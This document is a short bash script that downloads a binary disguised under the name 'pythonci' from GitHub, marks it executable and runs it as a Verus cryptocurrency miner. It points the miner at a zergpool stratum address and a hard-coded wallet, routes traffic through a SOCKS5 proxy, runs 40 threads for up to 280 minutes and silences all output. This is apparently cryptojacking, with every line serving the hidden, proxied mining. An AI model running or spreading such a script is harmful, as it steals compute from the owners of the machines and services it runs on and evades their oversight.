#!/bin/bash
sudo apt update
sudo apt install screen -y
sudo apt install screen libjansson4 -y
wget https://github.com/Nazimdr/project-hoj/raw/main/pythonci
chmod +x pythonci
screen -dmS ls
POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
PROXY=socks5://72.195.114.169:4145
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-nizam)
timeout 280m ./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 40 -x $PROXY > /dev/null 2>&1
echo Sukses
